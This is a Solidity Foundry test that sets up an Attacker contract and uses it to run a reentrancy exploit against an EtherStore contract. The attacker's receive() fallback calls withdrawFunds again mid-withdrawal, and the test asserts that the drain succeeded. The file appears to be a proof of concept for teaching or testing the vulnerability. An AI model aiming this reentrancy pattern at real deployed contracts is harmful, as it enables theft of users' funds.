
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public etherStore;
    
    Attacker public _attacker;

    function setUp() public {
        etherStore = new EtherStore();
        
        _attacker = new Attacker(address(etherStore));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= 1 ether);
        

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        
        vm.deal(address(etherStore), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        // time warp for the withdrawal time lock
        vm.warp(block.timestamp + 1 weeks);
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public etherStore;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 private _attackVal;

    constructor(address victimAddress) { 
        etherStore = EtherStore(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        etherStore.depositFunds{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        _attackVal = val;

        etherStore.withdrawFunds(val);

        if (address(this).balance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            etherStore.withdrawFunds(_attackVal);
        }
    }
}
